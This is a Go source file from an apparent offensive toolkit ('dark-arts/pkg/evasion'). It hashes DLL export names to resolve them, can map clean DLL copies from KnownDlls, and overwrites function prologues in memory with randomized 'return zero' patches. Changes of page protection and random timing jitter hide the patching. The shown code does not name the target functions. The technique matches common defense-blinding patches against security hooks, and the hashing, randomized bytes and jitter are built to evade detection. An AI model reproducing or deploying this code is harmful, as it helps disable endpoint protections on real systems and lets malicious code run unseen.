//go:build windows && amd64

package securityctl

import (
	"crypto/rand"
	"errors"
	"fmt"
	mrand "math/rand"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"

	"dark-arts/pkg/evasion"
)

const (
	patchLen     = 16
	pageRW       = 0x04
	pageReadOnly = 0x02
	pageRX       = 0x20
)

type funcPatch struct {
	addr     uintptr
	orig     []byte
	patch    []byte
	dllName  string
	funcName string
}

func init() {
	mrand.Seed(time.Now().UnixNano())
}

func djb2(s string) uint32 {
	h := uint32(5381)
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h = h*33 + uint32(c)
	}
	return h
}

func jitter(min, max time.Duration) {
	if max <= min {
		return
	}
	d := min + time.Duration(mrand.Int63n(int64(max-min)))
	time.Sleep(d)
}

func randomPatchBytes() []byte {
	zeroReg := [][]byte{
		{0x33, 0xC0},
		{0x31, 0xC0},
		{0x29, 0xC0},
		{0x48, 0x31, 0xC0},
		{0x45, 0x31, 0xC0},
	}
	reg := zeroReg[mrand.Intn(len(zeroReg))]
	patch := make([]byte, patchLen)
	copy(patch, reg)
	patch[len(reg)] = 0xC3
	for i := len(reg) + 1; i < patchLen; i++ {
		patch[i] = 0xCC
	}
	return patch
}

func toPtr(u uintptr) unsafe.Pointer {
	return unsafe.Pointer(uintptr(unsafe.Pointer(nil)) + u)
}

func resolveFuncByHash(dllName, funcName string) (*funcPatch, error) {
	jitter(1*time.Millisecond, 5*time.Millisecond)
	k32 := syscall.NewLazyDLL("kernel32.dll")
	loadLibraryW := k32.NewProc("LoadLibraryW")
	namePtr, _ := syscall.UTF16PtrFromString(dllName)
	modBase, _, _ := loadLibraryW.Call(uintptr(unsafe.Pointer(namePtr)))
	if modBase == 0 {
		return nil, fmt.Errorf("securityctl: LoadLibraryW(%s) failed", dllName)
	}
	jitter(500*time.Microsecond, 2*time.Millisecond)
	fn, err := resolveExportAt(toPtr(modBase), djb2(funcName))
	if err != nil {
		return nil, fmt.Errorf("securityctl: resolve %s!%s: %w", dllName, funcName, err)
	}
	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}
	jitter(100*time.Microsecond, 500*time.Microsecond)
	return &funcPatch{
		addr:     uintptr(fn),
		orig:     orig,
		dllName:  dllName,
		funcName: funcName,
	}, nil
}

func resolveFuncFromBase(base uintptr, funcName string) (*funcPatch, error) {
	fn, err := resolveExportAt(toPtr(base), djb2(funcName))
	if err != nil {
		return nil, fmt.Errorf("securityctl: resolve %s: %w", funcName, err)
	}
	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}
	return &funcPatch{
		addr:     uintptr(fn),
		orig:     orig,
		funcName: funcName,
	}, nil
}

func resolveFuncFromKnownDlls(dllName, funcName string) (*funcPatch, error) {
	nt := syscall.NewLazyDLL("ntdll.dll")
	openSection := nt.NewProc("NtOpenSection")
	mapView := nt.NewProc("NtMapViewOfSection")
	closeHandle := nt.NewProc("NtClose")

	sectionPath := "\\KnownDlls\\" + dllName
	u16 := utf16.Encode([]rune(sectionPath))
	us := &struct {
		Length        uint16
		MaximumLength uint16
		Buffer        *uint16
	}{
		Length:        uint16(len(u16) * 2),
		MaximumLength: uint16(len(u16)*2 + 2),
		Buffer:        &u16[0],
	}
	oa := &struct {
		Length             uint32
		RootDirectory      uintptr
		ObjectName         uintptr
		Attributes         uint32
		SecurityDescriptor uintptr
		SecurityQoS        uintptr
	}{
		Length:     0x30,
		ObjectName: uintptr(unsafe.Pointer(us)),
	}

	var sectionHandle uintptr
	st, _, _ := openSection.Call(
		uintptr(unsafe.Pointer(&sectionHandle)),
		0x0004,
		uintptr(unsafe.Pointer(oa)),
	)
	if st != 0 {
		return nil, fmt.Errorf("securityctl: NtOpenSection(%s): 0x%X", sectionPath, st)
	}

	var base uintptr
	var viewSize uintptr
	st, _, _ = mapView.Call(
		sectionHandle,
		^uintptr(0),
		uintptr(unsafe.Pointer(&base)),
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&viewSize)),
		1,
		0,
		0x02,
	)
	if st != 0 {
		closeHandle.Call(sectionHandle)
		return nil, fmt.Errorf("securityctl: NtMapViewOfSection(%s): 0x%X", sectionPath, st)
	}

	fn, err := resolveExportAt(toPtr(base), djb2(funcName))
	closeHandle.Call(sectionHandle)
	if err != nil {
		return nil, fmt.Errorf("securityctl: resolve from KnownDlls %s: %w", funcName, err)
	}

	orig := make([]byte, patchLen)
	for i := 0; i < patchLen; i++ {
		orig[i] = *(*byte)(unsafe.Add(fn, i))
	}

	return &funcPatch{
		addr:     uintptr(fn),
		orig:     orig,
		dllName:  dllName,
		funcName: funcName,
	}, nil
}

func applyPatch(fp *funcPatch) error {
	if len(fp.patch) == 0 {
		return errors.New("securityctl: no patch bytes")
	}
	jitter(100*time.Microsecond, 1*time.Millisecond)
	page := fp.addr &^ 0xFFF
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
		return fmt.Errorf("securityctl: protect RW: %w", err)
	}
	jitter(50*time.Microsecond, 200*time.Microsecond)
	for i := 0; i < len(fp.patch) && i < patchLen; i++ {
		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.patch[i]
	}
	jitter(50*time.Microsecond, 200*time.Microsecond)
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRX); err != nil {
		return fmt.Errorf("securityctl: protect restore: %w", err)
	}
	jitter(100*time.Microsecond, 500*time.Microsecond)
	return nil
}

func restorePatch(fp *funcPatch) error {
	if len(fp.orig) == 0 {
		return errors.New("securityctl: no original bytes")
	}
	page := fp.addr &^ 0xFFF
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRW); err != nil {
		return fmt.Errorf("securityctl: protect RW: %w", err)
	}
	for i := 0; i < len(fp.orig); i++ {
		*(*byte)(unsafe.Add(toPtr(fp.addr), i)) = fp.orig[i]
	}
	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, page, 0x1000, pageRX); err != nil {
		return fmt.Errorf("securityctl: protect restore: %w", err)
	}
	return nil
}

func resolveExportAt(base unsafe.Pointer, want uint32) (unsafe.Pointer, error) {
	nt := unsafe.Add(base, uintptr(*(*uint32)(unsafe.Add(base, 0x3C))))
	opt := unsafe.Add(nt, 0x18)
	expRVA := *(*uint32)(unsafe.Add(opt, 0x70))
	if expRVA == 0 {
		return nil, errors.New("export directory missing")
	}
	sizeOfImage := uintptr(*(*uint32)(unsafe.Add(opt, 0x38)))
	exp := unsafe.Add(base, uintptr(expRVA))
	numNames := *(*uint32)(unsafe.Add(exp, 0x18))
	numFuncs := *(*uint32)(unsafe.Add(exp, 0x14))
	if numNames == 0 || numNames > 1<<20 || numFuncs == 0 {
		return nil, errors.New("malformed export directory")
	}
	funcsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x1C)))
	namesRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x20)))
	ordsRVA := uintptr(*(*uint32)(unsafe.Add(exp, 0x24)))
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Add(base, namesRVA+uintptr(i)*4))
		if nameRVA == 0 {
			continue
		}
		if hashExportName(unsafe.Add(base, uintptr(nameRVA))) == want {
			ord := uint32(*(*uint16)(unsafe.Add(base, ordsRVA+uintptr(i)*2)))
			if ord >= numFuncs {
				return nil, errors.New("export ordinal out of range")
			}
			fnRVA := uintptr(*(*uint32)(unsafe.Add(base, funcsRVA+uintptr(ord)*4)))
			if fnRVA == 0 {
				return nil, errors.New("export slot empty")
			}
			if sizeOfImage > 0 && fnRVA >= sizeOfImage {
				return nil, errors.New("export outside image")
			}
			return unsafe.Add(base, fnRVA), nil
		}
	}
	return nil, errors.New("export not found")
}

func hashExportName(p unsafe.Pointer) uint32 {
	h := uint32(5381)
	for {
		c := *(*byte)(p)
		if c == 0 {
			break
		}
		if c >= 'A' && c <= 'Z' {
			c += 32
		}
		h = h*33 + uint32(c)
		p = unsafe.Add(p, 1)
	}
	return h
}

func randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}
